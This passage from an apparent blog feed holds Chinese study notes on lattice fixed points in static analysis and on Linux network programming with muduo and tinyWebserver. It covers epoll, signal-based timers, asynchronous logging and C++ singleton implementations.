单调性与不动点定理（Monotonicity and Fixed Point Theorem）"></a>5. 单调性与不动点定理（Monotonicity and Fixed Point Theorem）</h3><p>目标问题：迭代算法一定会停止（到达不动点）吗？</p><ol><li>单调性<br>定义：函数f: $L \rightarrow L$，满足$∀x,y∈L，x⊑y⇒f(x)⊑f(y)$，则为单调的。</li><li>不动点理论<br>给定一个完全$lattice(L,⊑)$，如果f:$L→L$是单调的，并且L有限<br>那么我们能得到最小不动点，通过迭代：$f(⊥),f(f(⊥)),…,f_k(⊥)$直到找到最小的一个不动点。同理,能得到最大不动点，通过迭代：$f(⊤),f(f(⊤)),…,fk(⊤)$直到找到最大的一个不动点。</li></ol><h3 id="6-从lattice的角度看may-must分析"><a href="#6-从lattice的角度看may-must分析" class="headerlink" title="6. 从lattice的角度看may/must分析"></a>6. 从lattice的角度看may/must分析</h3><p>说明：may 和 must 分析算法都是从不安全到安全（是否安全取决于safe-aprroximate过程），从准确到不准确。<br><img src="lattice_may_must.png" alt=""></p><h4 id="1-may-分析"><a href="#1-may-分析" class="headerlink" title="1.may 分析"></a>1.may 分析</h4><p>以 Reaching Definitions分析为例：</p><ul><li><p>1.从 $\perp$ 开始，$\perp$ 表示所有定义都不可达，是不安全的结果（因为这个分析的应用目的是为了查错，查看变量是否需要初始化。首先在Entry中给每个变量一个假定义，标记所有变量为都为未初始化状态，表示所有的假定义都无法到达，说明所有变量在中间都进行了赋值，那就不需要对任何变量进行初始化，这是不安全的，可能导致未初始化错误）</p></li><li><p>2.$\top$表示所有Entry中的假定义都可达，从查错角度来说，需要对每个变量都进行初始化，非常安全！但是这句话没有用，我都要初始化的话还做这个分析干嘛？</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Static Analysis Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>muduo 库学习</title>
      <link href="/2021/12/09/muduo-%E5%BA%93%E5%AD%A6%E4%B9%A0/"/>
      <url>/2021/12/09/muduo-%E5%BA%93%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="网络编程相关学习"><a href="#网络编程相关学习" class="headerlink" title="网络编程相关学习"></a>网络编程相关学习</h1><h2 id="epoll"><a href="#epoll" class="headerlink" title="epoll"></a>epoll</h2><h3 id="select、poll、epoll-区别"><a href="#select、poll、epoll-区别" class="headerlink" title="select、poll、epoll 区别"></a>select、poll、epoll 区别</h3><ul><li>调用函数</li><li>select和poll都是一个函数，epoll是一组函数</li><li>文件描述符数量<ul><li>select通过线性表描述文件描述符集合，文件描述符有上限，一般是1024，但可以修改源码，重新编译内核。在linux/posix_types.h头文件有这样的声明：<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">__FD_SETSIZE</span>    <span class="token expression"><span class="token number">1024</span></span></span></code></pre>表示select最多同时监听1024个fd。</li><li>poll是链表描述，突破了文件描述符上限，最大可以打开文件的数目；</li><li>epoll通过红黑树描述，最大可以打开文件的数目，可以通过命令ulimit -n number修改，仅对当前终端有效</li></ul></li><li>将文件描述符从用户传给内核<ul><li>select和poll通过将所有文件描述符拷贝到内核态，每次调用都需要拷贝</li><li>epoll通过epoll_create建立一棵红黑树，通过epoll_ctl将要监听的文件描述符注册到红黑树上</li></ul></li><li>内核判断就绪的文件描述符<ul><li>select和poll通过遍历文件描述符集合，判断哪个文件描述符上有事件发生</li><li>epoll_create时，内核除了帮我们在epoll文件系统里建了个红黑树用于存储以后epoll_ctl传来的fd外，还会再建立一个list链表，用于存储准备就绪的事件，当epoll_wait调用时，仅仅观察这个list链表里有没有数据即可。</li><li>epoll是根据每个fd上面的回调函数(中断函数)判断，只有发生了事件的socket才会主动的去调用 callback函数，其他空闲状态socket则不会，若是就绪事件，插入list</li></ul></li><li>应用程序索引就绪文件描述符<ul><li>select/poll只返回发生了事件的文件描述符的个数，若知道是哪个发生了事件，同样需要遍历</li><li>epoll返回的发生了事件的个数和结构体数组，结构体包含socket的信息，因此直接处理返回的数组即可</li></ul></li><li>工作模式<ul><li>select和poll都只能工作在相对低效的LT模式下</li><li>epoll则可以工作在ET高效模式，并且epoll还支持EPOLLONESHOT事件，该事件能进一步减少可读、可写和异常事件被触发的次数。 </li></ul></li><li>应用场景<ul><li>当所有的fd都是活跃连接，使用epoll，需要建立文件系统，红黑书和链表对于此来说，效率反而不高，不如selece和poll</li><li>当监测的fd数目较小，且各个fd都比较活跃，建议使用select或者poll</li><li>当监测的fd数目非常大，成千上万，且单位时间只有其中的一部分fd处于就绪状态，这个时候使用epoll能够明显提升性能</li></ul></li></ul><h3 id="epoll接口"><a href="#epoll接口" class="headerlink" title="epoll接口"></a>epoll接口</h3><ul><li><p>int epoll_create(int size);<br>创建一个epoll的句柄，size用来告诉内核这个监听的数目一共有多大。这个参数不同于select()中的第一个参数，给出最大监听的fd+1的值。需要注意的是，当创建好epoll句柄后，它就是会占用一个fd值，在linux下如果查看/proc/进程id/fd/，是能够看到这个fd的，所以在使用完epoll后，必须调用close()关闭，否则可能导致fd被耗尽。</p></li><li><p>int epoll_ctl(int epfd, int op, int fd, struct epoll_event *event);<br>epoll的事件注册函数，它不同与select()是在监听事件时告诉内核要监听什么类型的事件，而是在这里先注册要监听的事件类型。第一个参数是epoll_create()的返回值，第二个参数表示动作，用三个宏来表示：</p><ul><li>EPOLL_CTL_ADD：注册新的fd到epfd中；</li><li>EPOLL_CTL_MOD：修改已经注册的fd的监听事件；</li><li>EPOLL_CTL_DEL：从epfd中删除一个fd；</li></ul><p>第三个参数是需要监听的fd，第四个参数是告诉内核需要监听什么事，struct epoll_event结构如下：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">union</span> epoll_data <span class="token punctuation">&#123;</span>  <span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">;</span>  <span class="token keyword">int</span> fd<span class="token punctuation">;</span>  __uint32_t u32<span class="token punctuation">;</span>  __uint64_t u64<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token class-name">epoll_data_t</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">epoll_event</span> <span class="token punctuation">&#123;</span>    __uint32_t events<span class="token punctuation">;</span> <span class="token comment">/* Epoll events */</span>    <span class="token class-name">epoll_data_t</span> data<span class="token punctuation">;</span> <span class="token comment">/* User data variable */</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><p>events可以是以下几个宏的集合：</p><ul><li>EPOLLIN ：表示对应的文件描述符可以读（包括对端SOCKET正常关闭）；</li><li>EPOLLOUT：表示对应的文件描述符可以写；</li><li>EPOLLPRI：表示对应的文件描述符有紧急的数据可读（这里应该表示有带外数据到来）；</li><li>EPOLLERR：表示对应的文件描述符发生错误；</li><li>EPOLLHUP：表示对应的文件描述符被挂断；</li><li>EPOLLET： 将EPOLL设为边缘触发(Edge Triggered)模式，这是相对于水平触发(Level Triggered)来说的。</li><li>EPOLLONESHOT：只监听一次事件，当监听完这次事件之后，如果还需要继续监听这个socket的话，需要再次把这个socket加入到EPOLL队列里</li><li>EPOLLRDHUP：代表对端断开连接，可以使得对端断开连接的异常在底层进行处理了，不用再移交到上层。</li></ul></li><li>int epoll_wait(int epfd, struct epoll_event * events, int maxevents, int timeout);<br>等待事件的产生，类似于select()调用。参数events用来从内核得到事件的集合，maxevents告之内核这个events有多大，这个 maxevents的值不能大于创建epoll_create()时的size，参数timeout是超时时间（毫秒，0会立即返回，-1是永久阻塞）。该函数返回需要处理的事件数目，如返回0表示已超时。<h3 id="ET、LT、EPOLLONESHOT"><a href="#ET、LT、EPOLLONESHOT" class="headerlink" title="ET、LT、EPOLLONESHOT"></a>ET、LT、EPOLLONESHOT</h3></li><li>LT水平触发模式<ul><li>epoll_wait检测到文件描述符有事件发生，则将其通知给应用程序，应用程序可以不立即处理该事件。</li><li>当下一次调用epoll_wait时，epoll_wait还会再次向应用程序报告此事件，直至被处理</li></ul></li><li>ET边缘触发模式<ul><li>epoll_wait检测到文件描述符有事件发生，则将其通知给应用程序，应用程序必须立即处理该事件</li><li>必须要一次性将数据读取完，使用非阻塞I/O，读取到出现eagain</li></ul></li><li>EPOLLONESHOT<ul><li>一个线程读取某个socket上的数据后开始处理数据，在处理过程中该socket上又有新数据可读，此时另一个线程被唤醒读取，此时出现两个线程处理同一个socket</li><li>一个socket连接在任一时刻都只被一个线程处理：通过epoll_ctl对该文件描述符注册epolloneshot事件，一个线程处理socket时，其他线程将无法处理，<strong>当该线程处理完后，需要通过epoll_ctl重置epolloneshot事件</strong></li></ul></li></ul><h2 id="处理非活跃链接"><a href="#处理非活跃链接" class="headerlink" title="处理非活跃链接"></a>处理非活跃链接</h2><ul><li>非活跃：指客户端（这里是浏览器）与服务器端建立连接后，长时间不交换数据，一直占用服务器端的文件描述符，导致连接资源的浪费。</li><li>定时事件：指固定一段时间之后触发某段代码，由该段代码处理一个事件，如从内核事件表删除事件，并关闭文件描述符，释放连接资源。</li><li>定时器，是指利用结构体或其他形式，将多种定时事件进行封装起来。这里只涉及一种定时事件，即定期检测非活跃连接，这里将该定时事件与连接资源封装为一个结构体定时器。</li><li>定时器容器，是指使用某种容器类数据结构，将上述多个定时器组合起来，便于对定时事件统一管理。具体的，项目中使用升序链表将所有定时器串联组织起来。</li></ul><h3 id="定时方法"><a href="#定时方法" class="headerlink" title="定时方法"></a>定时方法</h3><p>在tinyWebserver项目中，服务器主循环为每一个连接创建一个定时器，并对每个连接进行定时。另外，利用升序时间链表容器将所有定时器串联起来，若主循环接收到定时通知，则在链表中依次执行定时任务。<br>Linux下有三种定时方法：</p><ul><li>socket选项SO_RECVTIMEO和SO_SNDTIMEO</li><li>SIGALRM信号</li><li>I/O复用系统调用的超时参数<br>项目中使用的是SIGAKRAM信号</li></ul><h3 id="相关api"><a href="#相关api" class="headerlink" title="相关api"></a>相关api</h3><h4 id="sigaction结构体"><a href="#sigaction结构体" class="headerlink" title="sigaction结构体"></a>sigaction结构体</h4><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">sigaction</span>  <span class="token punctuation">&#123;</span>    <span class="token comment">/* Signal handler.  */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression">defined __USE_POSIX199309 <span class="token operator">||</span> defined __USE_XOPEN_EXTENDED</span></span>    <span class="token keyword">union</span>      <span class="token punctuation">&#123;</span><span class="token comment">/* Used if SA_SIGINFO is not set.  */</span>__sighandler_t sa_handler<span class="token punctuation">;</span><span class="token comment">/* Used if SA_SIGINFO is set.  */</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>sa_sigaction<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token class-name">siginfo_t</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    __sigaction_handler<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">define</span> <span class="token macro-name">sa_handler</span><span class="token expression">__sigaction_handler<span class="token punctuation">.</span>sa_handler</span></span><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">define</span> <span class="token macro-name">sa_sigaction</span><span class="token expression">__sigaction_handler<span class="token punctuation">.</span>sa_sigaction</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span>    __sighandler_t sa_handler<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>    <span class="token comment">/* Additional set of signals to be blocked.  */</span>    __sigset_t sa_mask<span class="token punctuation">;</span>    <span class="token comment">/* Special flags.  */</span>    <span class="token keyword">int</span> sa_flags<span class="token punctuation">;</span>    <span class="token comment">/* Restore handler.  */</span>    <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>sa_restorer<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><ul><li>sa_handler是一个函数指针，指向信号处理函数</li><li>sa_sigaction同样是信号处理函数，有三个参数，可以获得关于信号更详细的信息</li><li>sa_mask用来指定在信号处理函数执行期间需要被屏蔽的信号</li><li>sa_flags用于指定信号处理的行为<ul><li>SA_RESTART，使被信号打断的系统调用自动重新发起</li><li>SA_NOCLDSTOP，使父进程在它的子进程暂停或继续运行时不会收到 SIGCHLD 信号</li><li>SA_NOCLDWAIT，使父进程在它的子进程退出时不会收到 SIGCHLD 信号，这时子进程如果退出也不会成为僵尸进程</li><li>SA_NODEFER，使对信号的屏蔽无效，即在信号处理函数执行期间仍能发出这个信号</li><li>SA_RESETHAND，信号处理之后重新设置为默认的处理方式</li><li>SA_SIGINFO，使用 sa_sigaction 成员而不是 sa_handler 作为信号处理函数</li></ul></li><li>sa_restorer一般不使用</li></ul><h4 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h4><ul><li><p>sigaciton 函数</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;signal.h></span></span><span class="token keyword">int</span> <span class="token function">sigaction</span><span class="token punctuation">(</span><span class="token keyword">int</span> signum<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">sigaction</span> <span class="token operator">*</span>act<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">sigaction</span> <span class="token operator">*</span>oldact<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><ul><li>signum表示操作的信号。</li><li>act表示对信号设置新的处理方式。</li><li>oldact表示信号原来的处理方式。</li><li>返回值，0 表示成功，-1 表示有错误发生。</li></ul></li><li><p>sigfillset函数</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">sigfillset</span><span class="token punctuation">(</span><span class="token class-name">sigset_t</span> <span class="token operator">*</span>set<span class="token punctuation">)</span><span class="token punctuation">;</span>w</code></pre><p>用来将参数set信号集初始化，然后把所有的信号加入到此信号集里。</p></li><li>SIGALRM、SIGTERM信号<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SIGALRM</span>  <span class="token expression"><span class="token number">14</span>     </span><span class="token comment">//由alarm系统调用产生timer时钟信号</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SIGTERM</span>  <span class="token expression"><span class="token number">15</span>     </span><span class="token comment">//终端发送的终止信号</span></span></code></pre></li><li>alarm函数<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">alarm</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> seconds<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>设置信号传送闹钟，即用来设置信号SIGALRM在经过参数seconds秒数后发送给目前的进程。如果未设置信号SIGALRM的处理函数，那么alarm()默认处理终止进程.</li><li>socketpair函数<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">socketpair</span><span class="token punctuation">(</span><span class="token keyword">int</span> domain<span class="token punctuation">,</span> <span class="token keyword">int</span> type<span class="token punctuation">,</span> <span class="token keyword">int</span> protocol<span class="token punctuation">,</span> <span class="token keyword">int</span> sv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><ul><li>domain表示协议族，PF_UNIX或者AF_UNIX等等，主要用来IPC。</li><li>type表示协议，可以是SOCK_STREAM或者SOCK_DGRAM，SOCK_STREAM基于TCP，SOCK_DGRAM基于UDP</li><li>protocol表示类型，只能为0</li><li>sv[2]表示套节字柄对，该两个句柄作用相同，均能进行读写双向操作</li><li>返回结果， 0为创建成功，-1为创建失败</li></ul></li><li>send 函数<pre class="language-c" data-language="c"><code class="language-c"><span class="token class-name">ssize_t</span> <span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">int</span> sockfd<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> len<span class="token punctuation">,</span> <span class="token keyword">int</span> flags<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>当套接字发送缓冲区变满时，send通常会阻塞，除非套接字设置为非阻塞模式，当缓冲区变满时，返回EAGAIN或者EWOULDBLOCK错误，此时可以调用select函数来监视何时可以发送数据。</li></ul><h2 id="日志相关"><a href="#日志相关" class="headerlink" title="日志相关"></a>日志相关</h2><h3 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h3><ul><li>生产者-消费者模型，并发编程中的经典模型。以多线程为例，为了实现线程间数据同步，生产者线程与消费者线程共享一个缓冲区，其中生产者线程往缓冲区中push消息，消费者线程从缓冲区中pop消息。</li><li>阻塞队列，将生产者-消费者模型进行封装，使用循环数组实现队列，作为两者共享的缓冲区。</li><li>日志：由服务器自动创建，并记录运行状态，错误信息，访问数据的文件。<ul><li>同步日志：日志写入函数与工作线程串行执行，由于涉及到I/O操作，当单条日志比较大的时候，同步模式会阻塞整个处理流程，服务器所能处理的并发能力将有所下降，尤其是在峰值的时候，写日志可能成为系统的瓶颈。</li><li>将所写的日志内容先存入阻塞队列，写线程从阻塞队列中取出内容，写入日志。</li></ul></li><li>单例模式：保证一个类只创建一个实例，同时提供全局访问的方法。</li></ul><h3 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a>单例模式</h3><p>单例模式，简单来说就是保证一个类最多存在一个实例，并且这种保证是来自于设计者，而不是使用者。而实现这样需求的办法就是：让类的构造函数私有，在类内创建一个静态对象，并创建一个公有的静态方法访问这个对象。<br>单例模式的实现有懒汉模式和饿汉模式。下面是这两种模式的实现。</p><ul><li><p>饿汉模式：是线程安全的，所以在访问量比较大，或者可能访问的线程比较多时，采用饿汉实现（不用锁机制，开销小），可以实现更好的性能。</p><pre class="language-c" data-language="c"><code class="language-c">class Singleton<span class="token punctuation">&#123;</span>private<span class="token operator">:</span>    <span class="token function">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"i am single"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">static</span> Singleton <span class="token operator">*</span>instance<span class="token punctuation">;</span>public<span class="token operator">:</span>    <span class="token keyword">static</span> Singleton <span class="token operator">*</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> instance<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>Singleton <span class="token operator">*</span>Singleton<span class="token operator">::</span>instance <span class="token operator">=</span> new <span class="token function">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    Singleton <span class="token operator">*</span>one <span class="token operator">=</span> Singleton<span class="token operator">::</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Singleton <span class="token operator">*</span>two <span class="token operator">=</span> Singleton<span class="token operator">::</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>one <span class="token operator">==</span> two<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"单例！"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">/*结果：i am single单例！*/</span></code></pre></li><li><p>懒汉模式：第一次用才去实例化，访问量较小时，采用懒汉模式；非线程安全，当多线程访问时可能会创建多个实例。</p><pre class="language-c" data-language="c"><code class="language-c">class Singleton<span class="token punctuation">&#123;</span>private<span class="token operator">:</span>    <span class="token function">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"i am single"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">static</span> Singleton <span class="token operator">*</span>instance<span class="token punctuation">;</span>public<span class="token operator">:</span>    <span class="token keyword">static</span> Singleton <span class="token operator">*</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>instance <span class="token operator">==</span> nullptr<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            instance <span class="token operator">=</span> new <span class="token function">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            cout <span class="token operator">&lt;&lt;</span> <span class="token string">"first"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span>            cout <span class="token operator">&lt;&lt;</span> <span class="token string">"second"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>                <span class="token keyword">return</span> instance<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>Singleton <span class="token operator">*</span>Singleton<span class="token operator">::</span>instance <span class="token operator">=</span> new <span class="token function">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    Singleton <span class="token operator">*</span>one <span class="token operator">=</span> Singleton<span class="token operator">::</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Singleton <span class="token operator">*</span>two <span class="token operator">=</span> Singleton<span class="token operator">::</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>one <span class="token operator">==</span> two<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"单例！"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">/*i am singlefirstsecond单例！*/</span></code></pre></li><li><p>使用懒汉模式下加锁：仅仅在判断是否为nullptr前，加了一个锁。这样效率会低，因为不管是否instance已经实例化，每次都要加锁进入临界区后才能做判断是否为nullptr。所以就有了下面的 double checked locking</p><pre class="language-c" data-language="c"><code class="language-c">class Singleton<span class="token punctuation">&#123;</span>private<span class="token operator">:</span>    <span class="token function">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"i am single"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token function">pthread_mutex_init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mutex<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">static</span> Singleton <span class="token operator">*</span>instance<span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token class-name">pthread_mutex_t</span> mutex<span class="token punctuation">;</span>public<span class="token operator">:</span>    <span class="token keyword">static</span> Singleton <span class="token operator">*</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">pthread_mutex_lock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>instance <span class="token operator">==</span> nullptr<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            instance <span class="token operator">=</span> new <span class="token function">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            cout <span class="token operator">&lt;&lt;</span> <span class="token string">"first"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span>            cout <span class="token operator">&lt;&lt;</span> <span class="token string">"second"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token function">pthread_mutex_unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> instance<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token class-name">pthread_mutex_t</span> Singleton<span class="token operator">::</span>mutex<span class="token punctuation">;</span>Singleton <span class="token operator">*</span>Singleton<span class="token operator">::</span>instance <span class="token operator">=</span> nullptr<span class="token punctuation">;</span></code></pre></li><li>懒汉模式下双加锁：<pre class="language-c" data-language="c"><code class="language-c">class Singleton<span class="token punctuation">&#123;</span>private<span class="token operator">:</span>    <span class="token function">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"i am single"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token function">pthread_mutex_init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mutex<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">static</span> Singleton <span class="token operator">*</span>instance<span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token class-name">pthread_mutex_t</span> mutex<span class="token punctuation">;</span>public<span class="token operator">:</span>    <span class="token keyword">static</span> Singleton <span class="token operator">*</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>instance <span class="token operator">==</span> nullptr<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">pthread_mutex_lock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>instance <span class="token operator">==</span> nullptr<span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                instance <span class="token operator">=</span> new <span class="token function">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                cout <span class="token operator">&lt;&lt;</span> <span class="token string">"first"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span>                cout <span class="token operator">&lt;&lt;</span> <span class="token string">"second"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>            <span class="token function">pthread_mutex_unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> instance<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre></li><li><p>DCL靠不住？<br>在muduo那本书中有写道：人们一直认为double checked locking是王道，有“神牛”指出由于乱序执行的影响，DCL（double checked locking）是靠不住的。<br>对于</p><pre class="language-c" data-language="c"><code class="language-c">instance <span class="token operator">=</span> new <span class="token function">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>编译器会分如下几步：<br>1、Singleton对象分配空间。<br>2、在分配的空间中构造对象<br>3、使instance指向分配的空间<br>其中2、3步是有可能交换的<br>就有可能发生这样的情况：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token number">1</span>、线程A进入了getInstance函数，并且执行了step1和step3，然后挂起。这时的状态是：instance不为nullptr，但instance指向的内存去没有对象！<span class="token number">2</span>、线程B进入了getInstance函数，发现instance不为nullptr，就直接<span class="token keyword">return</span> instance。</code></pre></li><li><p>c++11 解决了上述问题<br>在《Effective C++》提出了使用函数内的local static对象，如下所示。</p><pre class="language-c" data-language="c"><code class="language-c">class Singleton<span class="token punctuation">&#123;</span>private<span class="token operator">:</span>  <span class="token function">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token operator">~</span><span class="token function">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token function">Singleton</span><span class="token punctuation">(</span><span class="token keyword">const</span> Singleton<span class="token operator">&amp;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  Singleton<span class="token operator">&amp;</span> operator<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">const</span> Singleton<span class="token operator">&amp;</span><span class="token punctuation">)</span><span class="token 